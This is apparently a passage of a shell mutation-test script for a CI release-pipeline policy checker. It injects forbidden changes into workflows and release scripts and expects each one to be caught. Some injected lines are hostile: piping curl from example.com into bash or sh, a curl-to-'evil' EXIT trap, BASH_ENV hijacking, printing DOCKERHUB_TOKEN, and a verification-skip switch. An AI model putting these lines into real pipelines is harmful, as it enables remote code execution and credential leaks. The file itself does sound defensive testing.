c c_part    '=DOCKERHUB_TOKEN: ${{ secrets.DOCKERHUB_TOKEN }}\n          GH_TOKEN: ${{ github.token }}\n        run: bash bin/witnessed.sh release-sign' 'DOCKERHUB_TOKEN: ${{ secrets.DOCKERHUB_TOKEN }}x\n          GH_TOKEN: ${{ github.token }}\n        run: bash bin/witnessed.sh release-sign' 'whole read' "AC2 a credential read in part"
c c_foo     '=        run: bash bin/witnessed.sh release-apks bin/release-apks.sh' '        env:\n          FOO: bar\n        run: bash bin/witnessed.sh release-apks bin/release-apks.sh' 'release-apks' "AC2 an extra variable in the apk step"
# J1 (#822 round 2; the judge loads the workflow once and refuses a duplicate mapping key: PyYAML keeps the last one, so a second env: key would hide the first)
c c_dupapk  '=        run: bash bin/witnessed.sh release-apks bin/release-apks.sh' '        env:\n          FOO: bar\n        env:\n          BAZ: qux\n        run: bash bin/witnessed.sh release-apks bin/release-apks.sh' 'duplicate key' "AC2 a second env key on the apk step is refused, not hidden"
c c_dupver '(  release:\n.*?)\ \ \ \ \ \ \ \ run:\ bash\ bin/witnessed\-local\.sh\ release\-verify\ bin/release\-verify\.sh' '\1        env:\n          FOO: bar\n        env:\n          BAZ: qux\n        run: bash bin/witnessed-local.sh release-verify bin/release-verify.sh' 'duplicate key' "AC2 a second env key on the release-verify step is refused, not hidden"
# W1: the release job's env is exactly the three federation literals; no step repeats them
c c_jenvno '=    env:\n      AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing\n      AWS_REGION: us-east-1\n      RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing\n' '' 'the sign-release job must carry' "W1 the release job without a job env"
c c_jenvr '=      AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing\n' '' 'the sign-release job must carry' "W1 the job env without AWS_ROLE_ARN"
c c_jenvg '=      AWS_REGION: us-east-1\n' '' 'the sign-release job must carry' "W1 the job env without AWS_REGION"
c c_jenvk '=      RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing\n' '' 'the sign-release job must carry' "W1 the job env without RELEASE_KMS_KEY_REF"
c c_jenvx '=      RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing\n' '      RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing\n      FOO: bar\n' 'the sign-release job must carry' "W1 a fourth key in the job env"
c c_jenvgh '=      RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing\n' '      RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing\n      GH_TOKEN: ${{ github.token }}\n' 'the sign-release job must carry' "W1 the job env holds GH_TOKEN (credentials are never in the job env)"
c c_jenvdh '=      RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing\n' '      RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing\n      DOCKERHUB_TOKEN: ${{ secrets.DOCKERHUB_TOKEN }}\n' 'the sign-release job must carry' "W1 the job env holds DOCKERHUB_TOKEN"
c c_jenvsec '=      AWS_REGION: us-east-1' '      AWS_REGION: ${{ secrets.REGION }}' 'the sign-release job must carry' "W1 a secret in the job env"
c c_jenvexp '=      AWS_REGION: us-east-1' '      AWS_REGION: ${{ github.token }}' 'the sign-release job must carry' "W1 an expression in the job env"
c c_fedvar '=      AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing' '      AWS_ROLE_ARN: ${{ vars.ROLE }}' 'the sign-release job must carry' "W1 the job env role is a variable lookup, not a literal"
c c_fedvarg '=      AWS_REGION: us-east-1' '      AWS_REGION: ${{ vars.REGION }}' 'the sign-release job must carry' "W1 the job env region is a variable lookup"
c c_fedvark '=      RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing' '      RELEASE_KMS_KEY_REF: ${{ vars.KEY }}' 'the sign-release job must carry' "W1 the job env key reference is a variable lookup"
c c_fedacc '=      AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing' '      AWS_ROLE_ARN: arn:aws:iam::111111111111:role/fosterstack-cache-release-signing' 'the sign-release job must carry' "W1 the role of another account"
c c_fedrole '=      AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing' '      AWS_ROLE_ARN: arn:aws:iam::821302803867:role/other' 'the sign-release job must carry' "W1 another role in the same account"
c c_fedreg '=      AWS_REGION: us-east-1' '      AWS_REGION: eu-west-1' 'the sign-release job must carry' "W1 another region"
c c_fedkey '=      RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing' '      RELEASE_KMS_KEY_REF: awskms:///alias/other' 'the sign-release job must carry' "W1 a key reference that is not the verifier's RELEASE_KEY_REF"
c c_sverr '(  release:\n.*?)\ \ \ \ \ \ \ \ run:\ bash\ bin/witnessed\-local\.sh\ release\-verify' '\1        env:\n          AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing\n        run: bash bin/witnessed-local.sh release-verify' release-verify "W1 release-verify repeats AWS_ROLE_ARN as step env"
c c_sverg '(  release:\n.*?)\ \ \ \ \ \ \ \ run:\ bash\ bin/witnessed\-local\.sh\ release\-verify' '\1        env:\n          AWS_REGION: us-east-1\n        run: bash bin/witnessed-local.sh release-verify' release-verify "W1 release-verify repeats AWS_REGION as step env"
c c_sverk '(  release:\n.*?)\ \ \ \ \ \ \ \ run:\ bash\ bin/witnessed\-local\.sh\ release\-verify' '\1        env:\n          RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing\n        run: bash bin/witnessed-local.sh release-verify' release-verify "W1 release-verify repeats RELEASE_KMS_KEY_REF as step env"
c c_sapkr '=        run: bash bin/witnessed.sh release-apks' '        env:\n          AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing\n        run: bash bin/witnessed.sh release-apks' 'release-apks' "W1 release-apks repeats AWS_ROLE_ARN as step env"
c c_sapkg '=        run: bash bin/witnessed.sh release-apks' '        env:\n          AWS_REGION: us-east-1\n        run: bash bin/witnessed.sh release-apks' 'release-apks' "W1 release-apks repeats AWS_REGION as step env"
c c_sapkk '=        run: bash bin/witnessed.sh release-apks' '        env:\n          RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing\n        run: bash bin/witnessed.sh release-apks' 'release-apks' "W1 release-apks repeats RELEASE_KMS_KEY_REF as step env"
c c_sposr '=        run: bash bin/witnessed-local.sh release-postverify' '        env:\n          AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing\n        run: bash bin/witnessed-local.sh release-postverify' 'release-postverify' "W1 release-postverify repeats AWS_ROLE_ARN as step env"
c c_sposg '=        run: bash bin/witnessed-local.sh release-postverify' '        env:\n          AWS_REGION: us-east-1\n        run: bash bin/witnessed-local.sh release-postverify' 'release-postverify' "W1 release-postverify repeats AWS_REGION as step env"
c c_sposk '=        run: bash bin/witnessed-local.sh release-postverify' '        env:\n          RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing\n        run: bash bin/witnessed-local.sh release-postverify' 'release-postverify' "W1 release-postverify repeats RELEASE_KMS_KEY_REF as step env"
c c_spubr '=        run: bash bin/witnessed-local.sh release-publish' '          AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing\n        run: bash bin/witnessed-local.sh release-publish' 'release-publish' "W1 release-publish repeats AWS_ROLE_ARN as step env"
c c_spubg '=        run: bash bin/witnessed-local.sh release-publish' '          AWS_REGION: us-east-1\n        run: bash bin/witnessed-local.sh release-publish' 'release-publish' "W1 release-publish repeats AWS_REGION as step env"
c c_spubk '=        run: bash bin/witnessed-local.sh release-publish' '          RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing\n        run: bash bin/witnessed-local.sh release-publish' 'release-publish' "W1 release-publish repeats RELEASE_KMS_KEY_REF as step env"
c c_ssigr '=        run: bash bin/witnessed.sh release-sign' '          AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing\n        run: bash bin/witnessed.sh release-sign' 'release-sign' "W1 release-sign repeats AWS_ROLE_ARN as step env"
c c_ssigg '=        run: bash bin/witnessed.sh release-sign' '          AWS_REGION: us-east-1\n        run: bash bin/witnessed.sh release-sign' 'release-sign' "W1 release-sign repeats AWS_REGION as step env"
c c_ssigk '=        run: bash bin/witnessed.sh release-sign' '          RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing\n        run: bash bin/witnessed.sh release-sign' 'release-sign' "W1 release-sign repeats RELEASE_KMS_KEY_REF as step env"
c c_sassr '=        run: bash bin/witnessed-local.sh release-assets' '          AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing\n        run: bash bin/witnessed-local.sh release-assets' 'release-assets' "W1 release-assets repeats AWS_ROLE_ARN as step env"
c c_sassg '=        run: bash bin/witnessed-local.sh release-assets' '          AWS_REGION: us-east-1\n        run: bash bin/witnessed-local.sh release-assets' 'release-assets' "W1 release-assets repeats AWS_REGION as step env"
c c_sassk '=        run: bash bin/witnessed-local.sh release-assets' '          RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing\n        run: bash bin/witnessed-local.sh release-assets' 'release-assets' "W1 release-assets repeats RELEASE_KMS_KEY_REF as step env"
c c_fedinst '=      - name: install cosign\n        run: bash bin/install-scanner.sh cosign\n' '      - name: install cosign\n        env:\n          AWS_REGION: us-east-1\n        run: bash bin/install-scanner.sh cosign\n' 'up to release-verify' "W1 a federation entry on a step before release-verify that is not a witnessed one"
c c_fedlate 'run: bash bin/release-compare.sh' 'env:\n          AWS_REGION: us-east-1\n        run: bash bin/release-compare.sh' 'compare job' "W1 a federation entry on the compare job's step (the compare job holds no credential and no federation)"
c c_upenv   '(      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n)(        with:\n          name: witness-release\n          path: \|-)' '\1        env:\n          GH_TOKEN: ${{ github.token }}\n\2' 'only the witnessed' "AC2 an env on an upload step"
c c_pvreg   '=        run: bash bin/witnessed-local.sh release-postverify' '        env:\n          DOCKERHUB_TOKEN: ${{ secrets.DOCKERHUB_TOKEN }}\n        run: bash bin/witnessed-local.sh release-postverify' 'release-postverify' "AC2 (rule 79, rule 66) a registry credential in the post-publish step, which holds no credential at all"
c c_relenv  '=    environment: release\n'                       '    environment: release\n    env:\n      AWS_REGION: us-east-1\n'                                       'the release job must carry no env' "ruling 1 the release job carries any job env (it holds no KMS role, so not the three entries either)"
c c_evenv   '(  release-evidence:\n.*?    runs-on: ubuntu-24.04\n)' '\1    env:\n      AWS_REGION: us-east-1\n'                                         'the release-evidence job must carry no env' "ruling 2 release-evidence carries a job env"
c c_evsign  '=          GH_TOKEN: ${{ github.token }}\n        run: bash bin/witnessed-local.sh release-assets' '          GH_TOKEN: ${{ github.token }}\n          RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing\n        run: bash bin/witnessed-local.sh release-assets' 'release-assets' "ruling 2 release-assets of release-evidence names the KMS key reference"
c c_sgkms   '=      RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing\n' '' 'the sign-release job must carry' "ruling 1 sign-release has no key reference in its job env (the KMS role's three entries are its own)"
# ---- AC3: nothing outside the release job and sign-release holds them ---------------------------------------------------------
o() { rm -rf "${work:?}/$1"; cp -r "$work/o" "$work/$1"; python3 - "$work/$1/.github/workflows/$2" "$3" <<'PY'
import sys
open(sys.argv[1], "a").write(sys.argv[2] + "\n")
PY
  expect caught "$5" "$4" others "$work/$1"; }
EXTRA=$'  extra:\n    runs-on: ubuntu-24.04\n'
o o_pkg   scan.yml $'  other:\n    runs-on: ubuntu-24.04\n    permissions:\n      packages: write\n    steps:\n      - run: echo hi' 'packages write'      "AC3 packages write in a job of scan.yml that is not the call of release.yml"
o o_dh    persona-uat.yml "${EXTRA}    env:"$'\n      DOCKERHUB_TOKEN: x\n    steps:\n      - run: echo hi' 'a release credential' "AC3 a registry credential in persona-uat.yml"
o o_apk   ci.yml "${EXTRA}    env:"$'\n      APK_RELEASE_SIGNING_KEY: x\n    steps:\n      - run: echo hi' 'apk signing key' "AC3 the apk signing key in another workflow"
o o_env   scan.yml  $'  other:\n    runs-on: ubuntu-24.04\n    environment: release\n    steps:\n      - run: echo hi'  'release environment' "AC3 the release environment in scan.yml"
o o_rdh   release.yml "${EXTRA}    env:"$'\n      DOCKERHUB_TOKEN: x\n    steps:\n      - run: echo hi' 'release credential'  "AC3 a job of release.yml other than release and sign-release names a registry credential"
o o_rapk  release.yml "${EXTRA}    env:"$'\n      APK_RELEASE_SIGNING_KEY: x\n    steps:\n      - run: echo hi' 'release credential'  "AC3 a job of release.yml names the apk signing key"
o o_xenv  release.yml "${EXTRA}    environment: release"$'\n    steps:\n      - run: echo hi' 'only the release job is' "AC3 a second job in the release environment"
o o_xpkg  release.yml "${EXTRA}    permissions:"$'\n      packages: write\n    steps:\n      - run: echo hi' 'only the release job and sign-release' "AC3 a third job of release.yml holds packages write"
o o_xcw   release.yml "${EXTRA}    permissions:"$'\n      contents: write\n    steps:\n      - run: echo hi' 'only the release job and release-evidence' "AC3 a job of release.yml other than release and release-evidence holds contents write"
om() { # om NAME REGEX REPL WORD LABEL   (mutate the release.yml of the other-files fixture)
  if mutate "$work/stage.yml" "$work/$1.yml" "$2" "$3"; then rm -rf "${work:?}/$1"; cp -r "$work/o" "$work/$1"; cp "$work/$1.yml" "$work/$1/.github/workflows/release.yml"; expect caught "$5" "$4" others "$work/$1"; fi; }
om o_wf    '=permissions: {}\njobs'                               'permissions:\n  contents: read\n  packages: write\njobs'                              'workflow level'                       "AC3 release.yml grants packages write at the workflow level"
om o_inh   '=  release-compare:\n    runs-on: ubuntu-24.04\n'    '  release-compare:\n    secrets: inherit\n    runs-on: ubuntu-24.04\n'           'passes secrets'                       "AC3 a job that inherits the secrets"
om o_cp    '=  release-compare:\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n' '  release-compare:\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n      packages: write\n' 'only the release job and sign-release' "AC3 the compare job grants packages write (only the release job and sign-release may)"
om o_relid '=      packages: write\n    steps'                     '      packages: write\n      id-token: write\n    steps'                         'identity token'                       "AC3 (ruling 1) the release job holds an id-token"
om o_evid  '(  release-evidence:\n.*?contents: write\n)'          '\1      id-token: write\n'                                                            'identity token'                       "AC3 (ruling 2) release-evidence holds an id-token"
om o_vcw   '(  release-verify:\n.*?)contents: read'               '\1contents: write'                                                                    'only the release job and release-evidence' "AC3 release-verify holds contents write"
om o_vdh   '(  release-verify:\n)'                                '\1    env:\n      DOCKERHUB_TOKEN: x\n'                                         'release credential'                   "AC3 release-verify holds a registry credential"
om o_evenv '(  release-evidence:\n.*?    runs-on: ubuntu-24.04\n)' '\1    environment: release\n'                                                         'only the release job is'              "AC3 release-evidence is in the release environment"
# ---- AC11: the job graph -----------------------------------------------------------------------------------------------------
gm() { if mutate "$work/release.yml" "$work/$1.yml" "$2" "$3"; then expect caught "$5" "$4" graph "$work/$1.yml"; fi; }
# Rule 70 as amended by the Witness move (owner Oct 22) and the rulings of cache#921: Sign signs the building stages' records, so Rebuild and Check run side by side AFTER sign, sign-rebuild signs Rebuild's records, sign-check
# Check's; release-compare needs EXACTLY check, sign, sign-rebuild and sign-check, release-verify needs it, release needs both verify and compare, sign-release needs release and release-evidence needs sign-release.
RC_NEEDS='=  release-compare:\n    needs: [check, sign, sign-rebuild, sign-check]'
gm g_nosc    "$RC_NEEDS"  '  release-compare:\n    needs: [check, sign, sign-rebuild]'                                       'release-compare must need exactly' "AC11 release-compare does not need sign-check (Check's signed records)"
gm g_nosign  "$RC_NEEDS"  '  release-compare:\n    needs: [check, sign-rebuild, sign-check]'                                 'release-compare must need exactly' "AC11 release-compare does not need sign"
gm g_nochk   "$RC_NEEDS"  '  release-compare:\n    needs: [sign, sign-rebuild, sign-check]'                                  'release-compare must need exactly' "AC11 release-compare does not need check"
gm g_norb    "$RC_NEEDS"  '  release-compare:\n    needs: [check, sign, sign-check]'                                         'release-compare must need exactly' "AC11 release-compare does not need sign-rebuild (Rebuild's signed records)"
gm g_extra   "$RC_NEEDS"  '  release-compare:\n    needs: [check, sign, sign-rebuild, sign-check, decide]'                   'release-compare must need exactly' "AC11 release-compare waits for something else"
gm g_relbld  "$RC_NEEDS"  '  release-compare:\n    needs: [build-assemble, check, sign, sign-rebuild, sign-check]'           'release-compare must need exactly' "AC11 release-compare also lists build-assemble (not exactly the set: build is reached through check)"
gm g_relrb   "$RC_NEEDS"  '  release-compare:\n    needs: [check, rebuild-assemble, sign, sign-rebuild, sign-check]'         'release-compare must need exactly' "AC11 release-compare also lists rebuild-assemble (its signed record is what Release needs)"
gm g_rvneed  '=  release-verify:\n    needs: release-compare\n'            '  release-verify:\n    needs: [release-compare, check]\n'                               'release-verify must need exactly'  "AC11 release-verify waits for another job than release-compare"
gm g_rnone   '=    needs: [release-verify, release-compare]'                   '    needs: [release-verify]'                                                         'release must need exactly'         "AC11 release does not need release-compare"
gm g_rnoneed '=    needs: [release-verify, release-compare]'                   '    needs: [release-compare]'                                                        'release must need exactly'         "AC11 release does not need release-verify"
gm g_sgneed  '=  sign-release:\n    needs: [build-assemble, release]\n'                        '  sign-release:\n    needs: release-verify\n'                                          'sign-release must need exactly'    "AC11 sign-release does not wait for release (it would sign what is not published)"
gm g_evneed  '=  release-evidence:\n    needs: sign-release\n'               '  release-evidence:\n    needs: release\n'                                                'release-evidence must need exactly' "AC11 release-evidence does not wait for sign-release (it would attach unsigned evidence)"
gm g_scnochk '=  sign-check:\n    needs: [build-assemble, check]'            '  sign-check:\n    needs: [build-assemble]'                                                'sign-check must need exactly'      "REL-011 sign-check does not wait for check"
gm g_scnobld '=  sign-check:\n    needs: [build-assemble, check]'            '  sign-check:\n    needs: [check]'                                                         'sign-check must need exactly'      "REL-011 sign-check does not wait for build-assemble"
gm g_scextra '=  sign-check:\n    needs: [build-assemble, check]'            '  sign-check:\n    needs: [build-assemble, check, rebuild-assemble]'                       'sign-check must need exactly'      "REL-011 sign-check also waits for rebuild-assemble"
gm g_rbextra '=  rebuild-apk:\n    needs: build-assemble\n'                  '  rebuild-apk:\n    needs: [build-assemble, sign]\n'                                         'rebuild-apk must need exactly'     "AC11 (ruling 8) rebuild-apk waits for sign (it needs build-assemble only)"
gm g_rbnone  '=  rebuild-apk:\n    needs: build-assemble\n'                  '  rebuild-apk:\n'                                                                         'rebuild-apk must need exactly'     "AC11 (ruling 8) rebuild-apk waits for nothing"
gm g_srnoreb '=  sign-rebuild:\n    needs: [build-assemble, rebuild-assemble]' '  sign-rebuild:\n    needs: [build-assemble]'                                                'sign-rebuild must need exactly'    "AC11 sign-rebuild does not wait for rebuild-assemble"
gm g_cknogv  '=  check:\n    needs: [check-govulncheck, build-assemble, sign]' '  check:\n    needs: [build-assemble, sign]'                                           'check must need exactly'           "AC11 (ruling 8) check does not wait for check-govulncheck"
gm g_cknosn  '=  check:\n    needs: [check-govulncheck, build-assemble, sign]' '  check:\n    needs: [check-govulncheck, build-assemble]'                              'check must need exactly'           "AC11 (ruling 8) check does not wait for sign"
gm g_always  '=  rebuild-apk:\n    needs: build-assemble\n'                  "  rebuild-apk:\n    needs: build-assemble\n    if: \${{ always() }}\n"                   'status function'                   "AC11 rebuild-apk runs even when build failed"
gm g_prom    '(  release:\n    needs: \[release-verify, release-compare\]\n    if: )[^\n]*\n' '\1${{ !cancelled() }}\n'                                                         'must carry exactly the if'         "AC11 release runs when a predecessor was skipped"
gm g_noif    '(  release:\n    needs: \[release-verify, release-compare\]\n)    if: [^\n]*\n' '\1'                                                                       'must carry exactly the if'         "AC11 release carries no guard (a branch run would not be refused by its own if)"
gm g_sgnoif  '(  sign-release:\n    needs: \[build-assemble, release\]\n)    if: [^\n]*\n'                  '\1'                                                                                'must carry exactly the if'         "AC11 sign-release carries no guard"
gm g_evnoif  '(  release-evidence:\n    needs: sign-release\n)    if: [^\n]*\n'          '\1'                                                                                'must carry exactly the if'         "AC11 release-evidence carries no guard"
gm g_rvif    '=  release-verify:\n    needs: release-compare\n'            "  release-verify:\n    needs: release-compare\n    if: \${{ always() }}\n"                'must carry no if'                  "AC11 release-verify has an if (a failed compare job would not stop it)"
gm g_coe     '=  sign:\n    needs: build-assemble'                        '  sign:\n    continue-on-error: true\n    needs: build-assemble'                    'continue-on-error'                 "AC11 sign may fail without stopping release"
gm g_sec     '=  check:\n    needs: [check-govulncheck, build-assemble, sign]\n' '  check:\n    secrets: inherit\n    needs: [check-govulncheck, build-assemble, sign]\n' 'secrets'                          "AC11 check inherits secrets"
gm g_norel   '=  release:\n    needs'                                       '  promotion:\n    needs'                                                                    'no job release'                    "AC11 the last job before the signatures named promotion (the ratified name is release, Q9)"
gm g_tag     '=  rebuild-apk:\n    needs: build-assemble'                   '  other:\n    runs-on: ubuntu-latest\n    steps:\n      - run: git tag v9.9.9 && git push origin v9.9.9\n  rebuild-apk:\n    needs: build-assemble' 'creates a tag' "AC11 a job of release.yml creates a tag"
# nothing in release.yml cuts a tag or a release, the decide job included (handoff 0713 P8: no signer, so no tag)
dm() { if mutate "$work/release.yml" "$work/$1.yml" '=  decide:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: echo hi' "  decide:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: $2"; then expect caught "$4" "$3" graph "$work/$1.yml"; fi; }
dm g_dpush  'git push origin refs/tags/v9.9.9'                                           'creates a tag' "AC11 the decide job pushing a tag is refused (no job of release.yml creates one)"
dm g_dtag   'git tag v9.9.9'                                                             'creates a tag' "AC11 the decide job making a tag is refused"
dm g_drefs  'gh api repos/fosterstack/cache/git/refs -f ref=refs/tags/v9.9.9 -f sha=abc' 'creates a tag' "AC11 the decide job creating a tag through the refs API is refused"
dm g_drel   'gh release create v9.9.9'                                                   'creates a tag' "AC11 the decide job creating a release is refused"
# ---- AC4: the order of bin/release-verify.sh ------------------------------------------------------------------------------------
vm() { if mutate "$work/verify.sh" "$work/$1.sh" "$2" "$3"; then expect caught "$5" "$4" verify "$work/$1.sh"; fi; }
vm v_notag   '\[\[ "\$\{GITHUB_REF_NAME[^\n]*\n'            ''                                                       'commands'           "AC4 the tag check dropped"
vm v_wide    '\(-rc'                                         '(-beta'                                                 'not the pinned form' "AC4 the tag rule widened to another suffix"
vm v_nopol   'python3 bin/chain-verify.py policy make[^\n]*\n' ''                                                     'commands'           "AC4 the release policy is not made for the tag"
vm v_ref     '--tag "\$GITHUB_REF_NAME"'                     '--ref "$GITHUB_REF"'                                    'not the pinned form' "AC4 the policy made for a ref, not the tag"
vm v_nobuild 'python3 bin/chain-verify.py stage-start --stage release --previous build[^\n]*\n' ''                     'commands'           "AC4 Build's record is not verified"
vm v_nosign  'python3 bin/chain-verify.py stage-start --stage release --previous sign[^\n]*\n' ''                      'commands'           "AC4 Sign's provenance is not verified"
vm v_norbd   'python3 bin/chain-verify.py stage-start --stage release --previous rebuild[^\n]*\n' ''                   'commands'           "AC4 Rebuild's record is not verified"
vm v_nochk   'python3 bin/chain-verify.py check-list[^\n]*\n' ''                     'commands'           "AC4 Check's record is not verified"
vm v_nogv    'python3 bin/chain-verify.py bind-check[^\n]*\n' ''                                                     'commands'           "G the govulncheck stream is not bound to Check's scanners record"
vm v_gvrec   'witness-check/ubuntu-24.04/witness-scanners/scanners-collection.json' 'witness-check/ubuntu-24.04/witness-runtime/runtime-collection.json' 'not the pinned form' "G the stream bound to another Check record than the scanners record"
vm v_gvarm   'witness-check/ubuntu-24.04/witness-scanners' 'witness-check/ubuntu-24.04-arm/witness-scanners'                'not the pinned form' "ruling 7 the stream bound to the arm runner's scanners record (govulncheck runs on ubuntu-24.04 only)"
vm v_gvarmf  '--file check-results/ubuntu-24.04/govulncheck.json' '--file check-results/ubuntu-24.04-arm/govulncheck.json'  'not the pinned form' "ruling 7 the stream read from the arm runner's results"
vm v_gvflat  '--file check-results/ubuntu-24.04/govulncheck.json' '--file check-results/govulncheck.json'                    'not the pinned form' "ruling 7 the stream read from a results folder with no runner in its name"
vm v_gvfile  '--file check-results/ubuntu-24.04/govulncheck.json' '--file check-results/ubuntu-24.04/scan-results.json'                            'not the pinned form' "G bind-check names another file than govulncheck.json"
vm v_gvdig   '--digests witness-build/digests.json --file' '--file'                                                    'not the pinned form' "G the stream bound without Build's digest list"
vm v_gvfirst 'python3 bin/chain-verify.py check-list[^\n]*\n(python3 bin/chain-verify.py bind-check[^\n]*\n)' '\1python3 bin/chain-verify.py check-list --policy policy.json --digests witness-build/digests.json --dir witness-check\n' 'not the pinned form' "G the stream bound before Check's records are listed (rule 69's order)"
vm v_nobind  'python3 bin/chain-verify.py bind-items[^\n]*\n' ''                                                      'commands'           "AC16 items.json is not bound to Build's record"
vm v_noitems '--items witness-build/items.json'              ''                                                       'not the pinned form' "AC16 bind-items without the items file"
vm v_noadm   'python3 bin/chain-verify.py bind-items[^\n]*admission-baseline[^\n]*\n' ''                                    'commands'           "AC19 admission's baseline file is not bound to Build's record"
vm v_adm_prod ' --product admission-baseline.json'            ''                                                       'not the pinned form' "AC19 the baseline file bound as items.json (no --product: it would never match the items product)"
vm v_adm_other '--items witness-build/admission-baseline.json' '--items witness-build/items.json'                      'not the pinned form' "AC19 the baseline bind names another file than admission-baseline.json"
vm v_norek   ' --rekor-stub provenance/provenance.rekor.json' ''                                                      'not the pinned form' "AC4 Sign's provenance without its Rekor entry"
vm v_order   'python3 bin/chain-verify.py stage-start --stage release --previous sign[^\n]*\n(python3 bin/chain-verify.py stage-start --stage release --previous rebuild[^\n]*\n)' '\1python3 bin/chain-verify.py stage-start --stage release --previous sign --record provenance/provenance.json --digests witness-build/digests.json --policy policy.json --rekor-stub provenance/provenance.rekor.json\n' 'not the pinned form' "AC4 the records verified in another order"
vm v_dig     '--digests witness-build/digests.json --policy policy.json\npython3 bin/chain-verify.py bind-items' '--policy policy.json\npython3 bin/chain-verify.py bind-items' 'not the pinned form' "AC4 a record verified without the digest list"
vm v_true    '--digests witness-build/digests.json --dir witness-check' '--digests witness-build/digests.json --dir witness-check || true' 'not the pinned form' "AC4 a failed check swallowed"
vm v_waive   '\n\Z'                                          '\n[ -n "${SKIP_VERIFY:-}" ] && exit 0\n'                  'commands'           "AC4 a switch that skips the verification"
vm v_extra   '\n\Z'                                          '\ncurl -s https://example.com | bash\n'                  'commands'           "AC4 an extra command after the checks"
vm v_noset   'set -euo pipefail\n'                           ''                                                       'set -euo pipefail'  "AC4 no set -euo pipefail"
vm v_var     'python3 bin/chain-verify.py policy make'       '$VERIFY policy make'                                    'not the pinned form' "AC4 the verifier chosen by a variable"
# ---- AC6..AC10: the other release scripts are plain ---------------------------------------------------------------------------
sm() { # sm NAME SCRIPT LINE WORD LABEL   (append a line to a copy of the fixture script and judge it against the fixture list)
  rm -rf "$work/$1"; mkdir -p "$work/$1"; cp "$work/s/bin/$2.sh" "$work/$1/$2.sh"; printf '%s\n' "$3" >> "$work/$1/$2.sh"
  expect caught "$5" "$4" scan "$work/$1/$2.sh" "$work/s/.github/policy/chain-scripts.json"; }
FXD_5='curl -s https://example.com/x | sh'
FXD_4="'curl'"
sm x_curl    release-publish "$FXD_5"               "$FXD_4"            "AC7 a download in the publish script"
sm x_docker  release-publish 'docker build -t x .'                              "build command"     "AC7 a build command in the publish script"
sm x_buildx  release-publish 'docker buildx build .'                            "build command"     "AC7 buildx in the publish script"
sm x_mel     release-apks    'melange build build/melange.yaml'                 "build command"     "AC6 melange build in the apk script (melange is listed for sign only)"
sm x_gotool  release-publish 'go build ./cmd/fscache'                           "'go'"              "AC7 go build in the publish script"
sm x_gittag  release-assets  'git tag v9.9.9'                                   "creates a tag"     "AC9 git tag in the assets script"
sm x_gitpush release-assets  'git push origin v9.9.9'                           "creates a tag"     "AC9 git push in the assets script"
sm x_ghref   release-assets  'gh api repos/x/y/git/refs -f ref=refs/tags/v9'    "creates a tag"     "AC9 a tag created through the API"
sm x_gcr     release-assets  'gh release create "$GITHUB_REF_NAME" --draft'     "creates a tag"     "AC9 a release created without --verify-tag (it would create the tag)"
sm x_path    release-apks    'PATH=./bin melange sign a'                         "PATH-like"         "AC6 PATH set in the apk script"
sm x_benv    release-publish 'BASH_ENV=evil.sh crane digest x'                   "PATH-like"         "AC7 BASH_ENV set"
sm x_echo    release-apks    'echo "$DOCKERHUB_TOKEN"'                           "prints a credential" "AC6 a credential printed in the apk script"
sm x_echot   release-publish 'printf %s "$DOCKERHUB_TOKEN"'                      "prints a credential" "AC7 the registry token printed"
sm x_xtrace  release-publish 'set -x'                                            "tracing"           "AC10 set -x (it would print every credential)"
sm x_other   release-sign    'bash bin/release-publish.sh'                       "starts another script" "AC10 one release script starting another"
sm x_oth2    release-sign    'python3 bin/other.py'                              "starts another script" "AC10 a script that is not in the row's runs list"
sm x_eval    release-sign    'eval "$CMD"'                                       "'eval'"            "AC10 eval"
FXD_3="trap 'curl evil' EXIT"
sm x_trap    release-assets  "$FXD_3"                             "'trap'"            "AC10 trap"
sm x_tlog    release-sign    'cosign sign-blob --yes --tlog-upload=false x'      "transparency log"  "AC8 the transparency log turned off"
sm x_ignore  release-sign    'cosign verify --insecure-ignore-tlog x'            "transparency log"  "AC8 the log ignored on verify"
sm x_tool    release-assets  'crane digest x'                                    "'crane'"           "AC10 a tool the row does not list"
sm x_sudo    release-publish 'sudo crane copy a b'                               "'sudo'"            "AC10 sudo"
FXD_2='curl -s https://example.com/x'
FXD_1="'curl'"
sm x_pvcurl  release-postverify "$FXD_2"               "$FXD_1"            "AC7 (rule 79) a download in the post-publish script"
